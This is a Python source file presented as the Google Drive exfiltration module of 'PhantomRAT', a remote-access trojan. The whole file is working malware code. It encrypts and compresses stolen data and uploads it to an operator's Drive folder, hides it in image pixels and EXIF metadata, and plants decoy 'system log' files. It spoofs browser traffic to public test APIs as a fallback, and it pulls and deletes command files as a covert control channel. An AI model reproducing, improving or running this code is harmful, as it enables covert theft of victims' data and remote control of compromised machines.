"""
PhantomRAT Google Drive Exfiltration Module v2.0
Enhanced with better performance, reliability, and stealth features
"""

import requests
import json
import base64
import time
import random
import os
import sys
import tempfile
import hashlib
import hmac
import zlib
import struct
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, List, Any, Union
from dataclasses import dataclass, asdict
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from PIL import Image
import piexif
import io
import logging

# Configure logging
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)

# ============= CONFIGURATION =============
@dataclass
class DriveConfig:
    """Drive configuration with fallback support"""
    # Primary Google Drive credentials
    CLIENT_ID: str = 'YOUR_GOOGLE_CLIENT_ID'
    CLIENT_SECRET: str = 'YOUR_GOOGLE_CLIENT_SECRET'
    REFRESH_TOKEN: str = 'YOUR_REFRESH_TOKEN'
    FOLDER_ID: str = 'YOUR_DRIVE_FOLDER_ID'
    
    # Alternative exfiltration methods
    USE_DROPBOX: bool = False
    DROPBOX_TOKEN: str = ''
    USE_ONEDRIVE: bool = False
    ONEDRIVE_TOKEN: str = ''
    
    # Performance settings
    MAX_FILE_SIZE: int = 10 * 1024 * 1024  # 10MB
    CHUNK_SIZE: int = 256 * 1024  # 256KB chunks for large files
    CONNECTION_TIMEOUT: int = 30
    MAX_RETRIES: int = 3
    RETRY_DELAY: float = 2.0
    
    # Security settings
    ENCRYPTION_KEY: str = 'phantom_encryption_key_32_bytes!'  # Change this!
    USE_AESGCM: bool = True  # Use AES-GCM instead of Fernet
    ROTATE_KEYS: bool = True
    KEY_ROTATION_DAYS: int = 7
    
    # Stealth settings
    USE_STEGANOGRAPHY: bool = True
    USE_EXIF: bool = False
    USE_APP_TRAFFIC: bool = False
    COMPRESS_BEFORE_ENCRYPT: bool = True
    ADD_DECOY_FILES: bool = True
    DECOY_RATIO: float = 0.3  # 30% of files are decoys
    
    # Operational settings
    ACCESS_TOKEN_FILE: str = '.phantom_token'
    TOKEN_CACHE_DIR: str = '.phantom_cache'
    MAX_CACHE_SIZE: int = 50 * 1024 * 1024  # 50MB
    
    # Fallback endpoints
    FALLBACK_ENDPOINTS: List[str] = None
    
    def __post_init__(self):
        if self.FALLBACK_ENDPOINTS is None:
            self.FALLBACK_ENDPOINTS = [
                'https://www.googleapis.com',
                'https://drive.google.com',
                'https://content.googleapis.com'
            ]

# Initialize configuration
config = DriveConfig()

# ============= ENCRYPTION UTILITIES =============
class EncryptionManager:
    """Enhanced encryption management with key rotation"""
    
    def __init__(self, master_key: Optional[str] = None):
        self.master_key = master_key or config.ENCRYPTION_KEY.encode()
        self.current_keys = {}
        self.key_history = []
        self._init_keys()
    
    def _init_keys(self):
        """Initialize encryption keys"""
        # Generate keys from master
        salt = b'phantom_salt_2024'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=64,  # 32 for encryption + 32 for MAC
            salt=salt,
            iterations=100000,
        )
        derived_key = kdf.derive(self.master_key)
        
        # Current encryption key
        self.current_keys['encryption'] = derived_key[:32]
        
        # Fernet key (compatibility)
        fernet_key = base64.urlsafe_b64encode(self.current_keys['encryption'][:32])
        self.current_keys['fernet'] = Fernet(fernet_key)
        
        # HMAC key
        self.current_keys['hmac'] = derived_key[32:]
        
        # Track key creation
        self.key_history.append({
            'timestamp': time.time(),
            'key': self.current_keys['encryption'].hex(),
            'type': 'initial'
        })
    
    def encrypt(self, data: bytes, use_aesgcm: bool = None) -> bytes:
        """Encrypt data with either AES-GCM or Fernet"""
        if use_aesgcm is None:
            use_aesgcm = config.USE_AESGCM
        
        if use_aesgcm:
            return self._encrypt_aesgcm(data)
        else:
            return self._encrypt_fernet(data)
    
    def _encrypt_aesgcm(self, data: bytes) -> bytes:
        """Encrypt using AES-GCM (authenticated encryption)"""
        # Generate random nonce
        nonce = os.urandom(12)
        
        # Create AES-GCM cipher
        aesgcm = AESGCM(self.current_keys['encryption'])
        
        # Encrypt
        ciphertext = aesgcm.encrypt(nonce, data, None)
        
        # Return nonce + ciphertext
        return nonce + ciphertext
    
    def _encrypt_fernet(self, data: bytes) -> bytes:
        """Encrypt using Fernet (for compatibility)"""
        return self.current_keys['fernet'].encrypt(data)
    
    def decrypt(self, encrypted: bytes, use_aesgcm: bool = None) -> bytes:
        """Decrypt data"""
        if use_aesgcm is None:
            use_aesgcm = config.USE_AESGCM
        
        if use_aesgcm:
            return self._decrypt_aesgcm(encrypted)
        else:
            return self._decrypt_fernet(encrypted)
    
    def _decrypt_aesgcm(self, encrypted: bytes) -> bytes:
        """Decrypt AES-GCM encrypted data"""
        try:
            # Extract nonce (first 12 bytes) and ciphertext
            nonce = encrypted[:12]
            ciphertext = encrypted[12:]
            
            # Create AES-GCM cipher
            aesgcm = AESGCM(self.current_keys['encryption'])
            
            # Decrypt
            return aesgcm.decrypt(nonce, ciphertext, None)
        except Exception as e:
            logger.error(f"AES-GCM decryption failed: {e}")
            raise
    
    def _decrypt_fernet(self, encrypted: bytes) -> bytes:
        """Decrypt Fernet encrypted data"""
        try:
            return self.current_keys['fernet'].decrypt(encrypted)
        except Exception as e:
            logger.error(f"Fernet decryption failed: {e}")
            raise
    
    def rotate_key(self):
        """Rotate encryption key for enhanced security"""
        if not config.ROTATE_KEYS:
            return
        
        # Generate new key
        new_key = os.urandom(32)
        
        # Update current keys
        self.current_keys['encryption'] = new_key
        
        # Update Fernet key
        fernet_key = base64.urlsafe_b64encode(new_key)
        self.current_keys['fernet'] = Fernet(fernet_key)
        
        # Add to history
        self.key_history.append({
            'timestamp': time.time(),
            'key': new_key.hex(),
            'type': 'rotated'
        })
        
        # Keep only last 5 keys
        if len(self.key_history) > 5:
            self.key_history = self.key_history[-5:]
        
        logger.info("Encryption key rotated successfully")

# Initialize encryption
encryption_mgr = EncryptionManager()

# ============= TOKEN MANAGEMENT =============
class TokenManager:
    """Enhanced token management with caching and refresh"""
    
    def __init__(self):
        self.token_cache = {}
        self.cache_dir = Path(config.TOKEN_CACHE_DIR)
        self.cache_dir.mkdir(exist_ok=True)
    
    def get_access_token(self, service: str = 'google') -> Optional[str]:
        """Get OAuth access token with intelligent caching"""
        cache_file = self.cache_dir / f'{service}_token.json'
        
        # Check cache first
        if cache_file.exists():
            try:
                with open(cache_file, 'r') as f:
                    token_data = json.load(f)
                
                # Check if token is still valid
                expires_at = token_data.get('expires_at', 0)
                buffer_time = 300  # 5 minutes buffer
                
                if time.time() < expires_at - buffer_time:
                    return token_data['access_token']
            
            except Exception as e:
                logger.warning(f"Failed to read token cache: {e}")
        
        # Fetch new token
        token_data = self._fetch_new_token(service)
        if token_data:
            # Cache token
            self._cache_token(service, token_data)
            return token_data['access_token']
        
        return None
    
    def _fetch_new_token(self, service: str) -> Optional[Dict]:
        """Fetch new OAuth token"""
        if service == 'google':
            return self._fetch_google_token()
        elif service == 'dropbox':
            return self._fetch_dropbox_token()
        elif service == 'onedrive':
            return self._fetch_onedrive_token()
        
        return None
    
    def _fetch_google_token(self) -> Optional[Dict]:
        """Fetch Google OAuth token"""
        try:
            response = requests.post(
                'https://oauth2.googleapis.com/token',
                data={
                    'client_id': config.CLIENT_ID,
                    'client_secret': config.CLIENT_SECRET,
                    'refresh_token': config.REFRESH_TOKEN,
                    'grant_type': 'refresh_token'
                },
                timeout=config.CONNECTION_TIMEOUT
            )
            
            if response.status_code == 200:
                token_data = response.json()
                # Add expiration timestamp
                token_data['expires_at'] = time.time() + token_data.get('expires_in', 3600)
                return token_data
        
        except Exception as e:
            logger.error(f"Failed to fetch Google token: {e}")
        
        return None
    
    def _fetch_dropbox_token(self) -> Optional[Dict]:
        """Fetch Dropbox token (simplified)"""
        if not config.USE_DROPBOX:
            return None
        
        try:
            # Dropbox uses long-lived tokens
            return {
                'access_token': config.DROPBOX_TOKEN,
                'expires_at': time.time() + 3600 * 24 * 365  # 1 year
            }
        except:
            return None
    
    def _fetch_onedrive_token(self) -> Optional[Dict]:
        """Fetch OneDrive token (simplified)"""
        if not config.USE_ONEDRIVE:
            return None
        
        try:
            # OneDrive uses long-lived tokens
            return {
                'access_token': config.ONEDRIVE_TOKEN,
                'expires_at': time.time() + 3600 * 24 * 90  # 90 days
            }
        except:
            return None
    
    def _cache_token(self, service: str, token_data: Dict):
        """Cache token to file"""
        cache_file = self.cache_dir / f'{service}_token.json'
        
        try:
            with open(cache_file, 'w') as f:
                json.dump(token_data, f, indent=2)
        except Exception as e:
            logger.warning(f"Failed to cache token: {e}")
    
    def clear_cache(self):
        """Clear all cached tokens"""
        try:
            for file in self.cache_dir.glob('*_token.json'):
                file.unlink()
        except:
            pass

# Initialize token manager
token_mgr = TokenManager()

# ============= DRIVE OPERATIONS =============
class DriveManager:
    """Enhanced Google Drive operations with fallback support"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.upload_endpoints = self._get_upload_endpoints()
    
    def _get_upload_endpoints(self) -> List[str]:
        """Get prioritized list of upload endpoints"""
        endpoints = []
        
        # Primary Google Drive endpoint
        endpoints.append('https://www.googleapis.com/upload/drive/v3/files')
        
        # Add fallback endpoints from config
        for endpoint in config.FALLBACK_ENDPOINTS:
            if 'googleapis.com' in endpoint:
                endpoints.append(f"{endpoint}/upload/drive/v3/files")
        
        return endpoints
    
    def upload_file(self, filename: str, content: bytes, 
                   mimetype: str = 'application/octet-stream') -> Optional[str]:
        """Upload file to Google Drive with retry logic"""
        
        # Compress if enabled
        if config.COMPRESS_BEFORE_ENCRYPT and len(content) > 1024:
            try:
                compressed = zlib.compress(content, level=6)
                if len(compressed) < len(content):
                    content = compressed
                    mimetype = 'application/zlib'
                    logger.debug(f"Compressed {len(content)} bytes")
            except:
                pass
        
        # Encrypt content
        try:
            encrypted = encryption_mgr.encrypt(content)
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            return None
        
        # Try multiple endpoints
        for endpoint in self.upload_endpoints:
            file_id = self._attempt_upload(endpoint, filename, encrypted, mimetype)
            if file_id:
                logger.info(f"Upload successful to {endpoint}")
                
                # Create decoy files if enabled
                if config.ADD_DECOY_FILES and random.random() < config.DECOY_RATIO:
                    self._create_decoy_files()
                
                return file_id
        
        return None
    
    def _attempt_upload(self, endpoint: str, filename: str, 
                       content: bytes, mimetype: str) -> Optional[str]:
        """Attempt upload to specific endpoint"""
        token = token_mgr.get_access_token('google')
        if not token:
            return None
        
        for attempt in range(config.MAX_RETRIES):
            try:
                # Simple upload for small files
                if len(content) < 5 * 1024 * 1024:
                    return self._simple_upload(endpoint, token, filename, content, mimetype)
                else:
                    return self._resumable_upload(endpoint, token, filename, content, mimetype)
            
            except requests.exceptions.RequestException as e:
                logger.warning(f"Upload attempt {attempt + 1} failed: {e}")
                if attempt < config.MAX_RETRIES - 1:
                    time.sleep(config.RETRY_DELAY * (attempt + 1))
                continue
        
        return None
    
    def _simple_upload(self, endpoint: str, token: str, filename: str,
                      content: bytes, mimetype: str) -> Optional[str]:
        """Simple upload for files under 5MB"""
        metadata = {
            'name': filename,
            'parents': [config.FOLDER_ID],
            'description': 'System log file',
            'appProperties': {
                'phantom': 'true',
                'version': '2.0'
            }
        }
        
        # Create multipart request
        boundary = 'phantom_boundary_' + str(random.randint(1000, 9999))
        
        body = (
            f'--{boundary}\r\n'
            f'Content-Type: application/json; charset=UTF-8\r\n\r\n'
            f'{json.dumps(metadata)}\r\n'
            f'--{boundary}\r\n'
            f'Content-Type: {mimetype}\r\n\r\n'
        ).encode() + content + f'\r\n--{boundary}--\r\n'.encode()
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': f'multipart/related; boundary={boundary}',
            'Content-Length': str(len(body))
        }
        
        response = self.session.post(
            f'{endpoint}?uploadType=multipart',
            data=body,
            headers=headers,
            timeout=config.CONNECTION_TIMEOUT
        )
        
        if response.status_code in [200, 201]:
            return response.json().get('id')
        
        return None
    
    def _resumable_upload(self, endpoint: str, token: str, filename: str,
                         content: bytes, mimetype: str) -> Optional[str]:
        """Resumable upload for large files"""
        # Start resumable session
        metadata = {
            'name': filename,
            'parents': [config.FOLDER_ID]
        }
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json; charset=UTF-8',
            'X-Upload-Content-Type': mimetype,
            'X-Upload-Content-Length': str(len(content))
        }
        
        # Start session
        response = self.session.post(
            f'{endpoint}?uploadType=resumable',
            json=metadata,
            headers=headers,
            timeout=config.CONNECTION_TIMEOUT
        )
        
        if response.status_code != 200:
            return None
        
        upload_url = response.headers.get('Location')
        if not upload_url:
            return None
        
        # Upload in chunks
        chunk_size = config.CHUNK_SIZE
        total_size = len(content)
        uploaded = 0
        
        while uploaded < total_size:
            chunk_end = min(uploaded + chunk_size, total_size)
            chunk = content[uploaded:chunk_end]
            
            chunk_headers = {
                'Content-Length': str(len(chunk)),
                'Content-Range': f'bytes {uploaded}-{chunk_end-1}/{total_size}'
            }
            
            response = self.session.put(
                upload_url,
                data=chunk,
                headers=chunk_headers,
                timeout=config.CONNECTION_TIMEOUT
            )
            
            if response.status_code not in [200, 201, 308]:
                logger.error(f"Chunk upload failed: {response.status_code}")
                return None
            
            uploaded = chunk_end
        
        if response.status_code in [200, 201]:
            return response.json().get('id')
        
        return None
    
    def download_file(self, file_id: str) -> Optional[bytes]:
        """Download file from Google Drive"""
        token = token_mgr.get_access_token('google')
        if not token:
            return None
        
        try:
            headers = {'Authorization': f'Bearer {token}'}
            response = self.session.get(
                f'https://www.googleapis.com/drive/v3/files/{file_id}?alt=media',
                headers=headers,
                stream=True,
                timeout=config.CONNECTION_TIMEOUT
            )
            
            if response.status_code == 200:
                content = b''
                for chunk in response.iter_content(chunk_size=config.CHUNK_SIZE):
                    if chunk:
                        content += chunk
                
                return content
        
        except Exception as e:
            logger.error(f"Download failed: {e}")
        
        return None
    
    def list_files(self, query: str = None) -> List[Dict]:
        """List files in Drive folder"""
        token = token_mgr.get_access_token('google')
        if not token:
            return []
        
        try:
            headers = {'Authorization': f'Bearer {token}'}
            params = {
                'q': f"'{config.FOLDER_ID}' in parents",
                'fields': 'files(id,name,size,modifiedTime,description)',
                'pageSize': 100
            }
            
            if query:
                params['q'] += f' and ({query})'
            
            response = self.session.get(
                'https://www.googleapis.com/drive/v3/files',
                headers=headers,
                params=params,
                timeout=config.CONNECTION_TIMEOUT
            )
            
            if response.status_code == 200:
                files = response.json().get('files', [])
                
                # Sort by modified time (newest first)
                files.sort(key=lambda x: x.get('modifiedTime', ''), reverse=True)
                
                return files
        
        except Exception as e:
            logger.error(f"List files failed: {e}")
        
        return []
    
    def delete_file(self, file_id: str) -> bool:
        """Delete file from Drive"""
        token = token_mgr.get_access_token('google')
        if not token:
            return False
        
        try:
            headers = {'Authorization': f'Bearer {token}'}
            response = self.session.delete(
                f'https://www.googleapis.com/drive/v3/files/{file_id}',
                headers=headers,
                timeout=config.CONNECTION_TIMEOUT
            )
            
            return response.status_code in [200, 204]
        
        except:
            return False
    
    def _create_decoy_files(self):
        """Create decoy files to blend in"""
        if not config.ADD_DECOY_FILES:
            return
        
        decoy_names = [
            'system_log.txt',
            'error_report.json',
            'diagnostic_data.bin',
            'cache_cleanup.tmp',
            'update_log.dat'
        ]
        
        for name in decoy_names:
            if random.random() < 0.5:  # 50% chance per decoy
                decoy_content = f"System diagnostic data - {datetime.now()}\n"
                decoy_content += "=" * 50 + "\n"
                decoy_content += "No critical issues found.\n"
                decoy_content += "System maintenance completed successfully.\n"
                
                self.upload_file(name, decoy_content.encode(), 'text/plain')

# Initialize drive manager
drive_mgr = DriveManager()

# ============= STEGANOGRAPHY ENHANCEMENTS =============
class SteganographyManager:
    """Enhanced steganography with multiple methods"""
    
    @staticmethod
    def embed_in_image(data: bytes, method: str = 'lsb') -> Optional[bytes]:
        """Embed data in image using specified method"""
        if method == 'lsb':
            return SteganographyManager._embed_lsb(data)
        elif method == 'exif':
            return SteganographyManager._embed_exif(data)
        elif method == 'dct':
            return SteganographyManager._embed_dct(data)
        
        return None
    
    @staticmethod
    def _embed_lsb(data: bytes) -> Optional[bytes]:
        """Embed data in LSB of image pixels"""
        try:
            # Create random image
            width, height = 200, 200
            img = Image.new('RGB', (width, height))
            pixels = img.load()
            
            # Fill with random colors
            for x in range(width):
                for y in range(height):
                    pixels[x, y] = (
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255)
                    )
            
            # Convert data to binary
            binary_data = ''.join(format(byte, '08b') for byte in data)
            binary_data += '0' * 8  # End marker
            
            # Embed in LSB
            data_index = 0
            for x in range(width):
                for y in range(height):
                    if data_index >= len(binary_data):
                        break
                    
                    r, g, b = pixels[x, y]
                    
                    # Modify LSBs
                    if data_index < len(binary_data):
                        r = (r & 0xFE) | int(binary_data[data_index])
                        data_index += 1
                    if data_index < len(binary_data):
                        g = (g & 0xFE) | int(binary_data[data_index])
                        data_index += 1
                    if data_index < len(binary_data):
                        b = (b & 0xFE) | int(binary_data[data_index])
                        data_index += 1
                    
                    pixels[x, y] = (r, g, b)
                
                if data_index >= len(binary_data):
                    break
            
            # Save to bytes
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG', optimize=True)
            
            return img_bytes.getvalue()
        
        except Exception as e:
            logger.error(f"LSB embedding failed: {e}")
            return None
    
    @staticmethod
    def _embed_exif(data: bytes) -> Optional[bytes]:
        """Embed data in image EXIF metadata"""
        try:
            # Create simple image
            img = Image.new('RGB', (100, 100), color=(100, 100, 100))
            
            # Encrypt and encode data
            encrypted = encryption_mgr.encrypt(data)
            encoded = base64.b64encode(encrypted).decode()
            
            # Create EXIF data
            exif_dict = {
                "0th": {
                    piexif.ImageIFD.ImageDescription: encoded.encode(),
                    piexif.ImageIFD.Software: b"ImageProcessor v2.1",
                    piexif.ImageIFD.DateTime: datetime.now().strftime("%Y:%m:%d %H:%M:%S").encode()
                },
                "Exif": {
                    piexif.ExifIFD.UserComment: b"System generated image"
                }
            }
            
            exif_bytes = piexif.dump(exif_dict)
            
            # Save with EXIF
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='JPEG', exif=exif_bytes, quality=95)
            
            return img_bytes.getvalue()
        
        except Exception as e:
            logger.error(f"EXIF embedding failed: {e}")
            return None
    
    @staticmethod
    def _embed_dct(data: bytes) -> Optional[bytes]:
        """Embed data in DCT coefficients (simplified)"""
        # Note: Full DCT steganography requires more complex implementation
        # This is a simplified version
        try:
            img = Image.new('RGB', (300, 300), color=(150, 150, 150))
            
            # Add data as subtle color variations
            pixels = img.load()
            data_bytes = data + b'END'
            
            for i, byte in enumerate(data_bytes):
                if i >= 100:  # Limit embedding
                    break
                
                x = (i * 3) % 300
                y = ((i * 3) // 300) * 3 % 300
                
                # Encode byte in RGB values
                r = (byte >> 5) & 0x07
                g = (byte >> 2) & 0x07
                b = byte & 0x03
                
                pixels[x, y] = (
                    pixels[x, y][0] + r,
                    pixels[x, y][1] + g,
                    pixels[x, y][2] + b
                )
            
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            
            return img_bytes.getvalue()
        
        except Exception as e:
            logger.error(f"DCT embedding failed: {e}")
            return None
    
    @staticmethod
    def extract_from_image(image_data: bytes, method: str = 'auto') -> Optional[bytes]:
        """Extract data from steganographic image"""
        if method == 'auto':
            # Try all methods
            for m in ['lsb', 'exif', 'dct']:
                result = SteganographyManager._extract_with_method(image_data, m)
                if result:
                    return result
            return None
        else:
            return SteganographyManager._extract_with_method(image_data, method)
    
    @staticmethod
    def _extract_with_method(image_data: bytes, method: str) -> Optional[bytes]:
        """Extract using specific method"""
        try:
            if method == 'lsb':
                return SteganographyManager._extract_lsb(image_data)
            elif method == 'exif':
                return SteganographyManager._extract_exif(image_data)
            elif method == 'dct':
                return SteganographyManager._extract_dct(image_data)
        except:
            return None
    
    @staticmethod
    def _extract_lsb(image_data: bytes) -> Optional[bytes]:
        """Extract data from LSB"""
        try:
            img = Image.open(io.BytesIO(image_data))
            pixels = list(img.getdata())
            
            binary_data = ''
            for pixel in pixels:
                r, g, b = pixel
                binary_data += str(r & 1)
                binary_data += str(g & 1)
                binary_data += str(b & 1)
            
            # Convert binary to bytes
            bytes_data = bytearray()
            for i in range(0, len(binary_data), 8):
                byte_str = binary_data[i:i+8]
                if len(byte_str) == 8:
                    byte_val = int(byte_str, 2)
                    if byte_val == 0:  # Null terminator
                        break
                    bytes_data.append(byte_val)
            
            return bytes(bytes_data)
        
        except:
            return None
    
    @staticmethod
    def _extract_exif(image_data: bytes) -> Optional[bytes]:
        """Extract data from EXIF"""
        try:
            img = Image.open(io.BytesIO(image_data))
            exif_dict = piexif.load(img.info.get('exif', b''))
            
            # Try different EXIF fields
            fields_to_check = [
                piexif.ImageIFD.ImageDescription,
                piexif.ExifIFD.UserComment,
                piexif.ImageIFD.Software
            ]
            
            for field in fields_to_check:
                if field in exif_dict.get("0th", {}):
                    encoded = exif_dict["0th"][field].decode()
                    if encoded and len(encoded) > 10:
                        try:
                            encrypted = base64.b64decode(encoded)
                            decrypted = encryption_mgr.decrypt(encrypted)
                            return decrypted
                        except:
                            continue
            
            return None
        
        except:
            return None
    
    @staticmethod
    def _extract_dct(image_data: bytes) -> Optional[bytes]:
        """Extract data from DCT coefficients (simplified)"""
        try:
            img = Image.open(io.BytesIO(image_data))
            pixels = img.load()
            
            bytes_data = bytearray()
            
            for i in range(100):  # Check first 100 positions
                x = (i * 3) % img.width
                y = ((i * 3) // img.width) * 3 % img.height
                
                if x >= img.width or y >= img.height:
                    break
                
                r, g, b = pixels[x, y]
                
                # Extract encoded byte
                byte_val = ((r & 0x07) << 5) | ((g & 0x07) << 2) | (b & 0x03)
                
                if byte_val == ord('E'):
                    # Check for "END" marker
                    next_byte = ((pixels[x+1, y][0] & 0x07) << 5) | \
                               ((pixels[x+1, y][1] & 0x07) << 2) | \
                               (pixels[x+1, y][2] & 0x03)
                    
                    if next_byte == ord('N'):
                        break
                
                bytes_data.append(byte_val)
            
            return bytes(bytes_data)
        
        except:
            return None

# ============= MAIN EXFILTRATION FUNCTIONS =============
def exfiltrate_data(data: Dict, method: str = 'drive') -> bool:
    """
    Enhanced exfiltration with multiple methods
    
    Args:
        data: Dictionary of data to exfiltrate
        method: 'drive', 'stego', 'exif', or 'traffic'
    
    Returns:
        bool: Success status
    """
    try:
        # Convert data to JSON
        json_data = json.dumps(data, separators=(',', ':'))
        raw_data = json_data.encode()
        
        # Generate filename
        timestamp = int(time.time())
        random_id = random.randint(1000, 9999)
        hash_id = hashlib.sha256(raw_data).hexdigest()[:8]
        
        if method == 'drive':
            filename = f'syslog_{timestamp}_{hash_id}.dat'
            return _exfil_via_drive(filename, raw_data)
        
        elif method == 'stego':
            return _exfil_via_steganography(raw_data)
        
        elif method == 'exif':
            return _exfil_via_exif(raw_data)
        
        elif method == 'traffic':
            return _exfil_via_traffic(data)
        
        else:
            # Try all methods
            methods = ['drive', 'stego', 'exif', 'traffic']
            for m in methods:
                if exfiltrate_data(data, m):
                    logger.info(f"Exfiltration succeeded via {m}")
                    return True
            
            return False
    
    except Exception as e:
        logger.error(f"Exfiltration failed: {e}")
        return False

def _exfil_via_drive(filename: str, data: bytes) -> bool:
    """Exfiltrate via Google Drive"""
    try:
        # Upload to Drive
        file_id = drive_mgr.upload_file(filename, data)
        
        if file_id:
            logger.info(f"Drive upload successful: {filename}")
            
            # Optional: Also upload steganographic version
            if config.USE_STEGANOGRAPHY:
                stego_data = SteganographyManager.embed_in_image(data, 'lsb')
                if stego_data:
                    stego_filename = f'img_{filename[:-4]}.png'
                    drive_mgr.upload_file(stego_filename, stego_data, 'image/png')
            
            return True
    
    except Exception as e:
        logger.error(f"Drive exfiltration failed: {e}")
    
    return False

def _exfil_via_steganography(data: bytes) -> bool:
    """Exfiltrate via steganography"""
    try:
        stego_data = SteganographyManager.embed_in_image(data, 'lsb')
        if not stego_data:
            return False
        
        # Upload stego image
        timestamp = int(time.time())
        filename = f'photo_{timestamp}_{random.randint(1000, 9999)}.png'
        
        file_id = drive_mgr.upload_file(filename, stego_data, 'image/png')
        return file_id is not None
    
    except Exception as e:
        logger.error(f"Steganography exfiltration failed: {e}")
        return False

def _exfil_via_exif(data: bytes) -> bool:
    """Exfiltrate via EXIF metadata"""
    try:
        exif_data = SteganographyManager.embed_in_image(data, 'exif')
        if not exif_data:
            return False
        
        # Upload EXIF image
        timestamp = int(time.time())
        filename = f'photo_{timestamp}_{random.randint(1000, 9999)}.jpg'
        
        file_id = drive_mgr.upload_file(filename, exif_data, 'image/jpeg')
        return file_id is not None
    
    except Exception as e:
        logger.error(f"EXIF exfiltration failed: {e}")
        return False

def _exfil_via_traffic(data: Dict) -> bool:
    """Exfiltrate by blending with legitimate traffic"""
    try:
        # Generate fake user agent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json'
        }
        
        # Encode data in request
        encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
        
        # Split into chunks
        chunk_size = 100
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        # Send to multiple endpoints
        endpoints = [
            'https://httpbin.org/post',
            'https://jsonplaceholder.typicode.com/posts',
            'https://reqres.in/api/users'
        ]
        
        success_count = 0
        for i, chunk in enumerate(chunks[:3]):  # Send first 3 chunks
            endpoint = random.choice(endpoints)
            
            payload = {
                'data': chunk,
                'timestamp': time.time(),
                'request_id': f'req_{random.randint(10000, 99999)}'
            }
            
            try:
                response = requests.post(
                    endpoint,
                    json=payload,
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code in [200, 201]:
                    success_count += 1
            except:
                continue
        
        return success_count >= 2  # Require at least 2 successful sends
    
    except Exception as e:
        logger.error(f"Traffic exfiltration failed: {e}")
        return False

def fetch_commands() -> List[Dict]:
    """Fetch commands from Google Drive"""
    try:
        files = drive_mgr.list_files()
        commands = []
        
        for file in files:
            filename = file.get('name', '')
            file_id = file.get('id', '')
            
            # Check if this is a command file
            if filename.endswith(('.cmd', '.task', '.json', '.dat')):
                content = drive_mgr.download_file(file_id)
                if content:
                    try:
                        # Try to decrypt
                        decrypted = encryption_mgr.decrypt(content)
                        command = json.loads(decrypted.decode())
                        
                        # Add metadata
                        command['_metadata'] = {
                            'filename': filename,
                            'file_id': file_id,
                            'received_at': time.time()
                        }
                        
                        commands.append(command)
                        
                        # Delete after successful read
                        drive_mgr.delete_file(file_id)
                    
                    except:
                        # Try steganography extraction
                        if filename.endswith(('.png', '.jpg', '.jpeg')):
                            extracted = SteganographyManager.extract_from_image(content)
                            if extracted:
                                try:
                                    decrypted = encryption_mgr.decrypt(extracted)
                                    command = json.loads(decrypted.decode())
                                    
                                    command['_metadata'] = {
                                        'filename': filename,
                                        'file_id': file_id,
                                        'received_at': time.time()
                                    }
                                    
                                    commands.append(command)
                                    drive_mgr.delete_file(file_id)
                                except:
                                    continue
        
        return commands
    
    except Exception as e:
        logger.error(f"Failed to fetch commands: {e}")
        return []

def health_check() -> Dict:
    """Check exfiltration system health"""
    health = {
        'timestamp': time.time(),
        'drive_access': False,
        'token_valid': False,
        'encryption_working': False,
        'storage_available': True,
        'last_sync': None
    }
    
    # Check Drive access
    try:
        token = token_mgr.get_access_token('google')
        health['token_valid'] = token is not None
        
        if token:
            files = drive_mgr.list_files()
            health['drive_access'] = True
            health['file_count'] = len(files)
            
            if files:
                health['last_sync'] = files[0].get('modifiedTime')
    except:
        pass
    
    # Check encryption
    try:
        test_data = b'test'
        encrypted = encryption_mgr.encrypt(test_data)
        decrypted = encryption_mgr.decrypt(encrypted)
        health['encryption_working'] = test_data == decrypted
    except:
        pass
    
    # Check storage
    try:
        stat = os.statvfs('.')
        health['disk_free'] = stat.f_bavail * stat.f_frsize
        health['storage_available'] = health['disk_free'] > 10 * 1024 * 1024  # 10MB
    except:
        pass
    
    return health

# ============= PERFORMANCE OPTIMIZATIONS =============
class ExfiltrationQueue:
    """Queue for batch exfiltration"""
    
    def __init__(self, max_size: int = 100, max_wait: int = 300):
        self.queue = []
        self.max_size = max_size
        self.max_wait = max_wait
        self.last_flush = time.time()
    
    def add(self, data: Dict):
        """Add data to queue"""
        self.queue.append({
            'data': data,
            'timestamp': time.time(),
            'priority': data.get('priority', 1)
        })
        
        # Check if we should flush
        if len(self.queue) >= self.max_size or \
           (time.time() - self.last_flush) >= self.max_wait:
            self.flush()
    
    def flush(self):
        """Flush queue to exfiltration"""
        if not self.queue:
            return
        
        # Sort by priority (highest first)
        self.queue.sort(key=lambda x: x['priority'], reverse=True)
        
        # Batch data
        batch_data = {
            'batch_id': f'batch_{int(time.time())}_{random.randint(1000, 9999)}',
            'items': [item['data'] for item in self.queue],
            'count': len(self.queue),
            'created_at': self.last_flush,
            'flushed_at': time.time()
        }
        
        # Try exfiltration
        if exfiltrate_data(batch_data, 'drive'):
            logger.info(f"Batch exfiltration successful: {len(self.queue)} items")
            self.queue = []
            self.last_flush = time.time()
        else:
            logger.warning(f"Batch exfiltration failed, keeping {len(self.queue)} items")
            
            # Remove old items if queue is full
            if len(self.queue) > self.max_size * 2:
                self.queue = self.queue[:self.max_size]
    
    def size(self) -> int:
        """Get current queue size"""
        return len(self.queue)

# Initialize queue
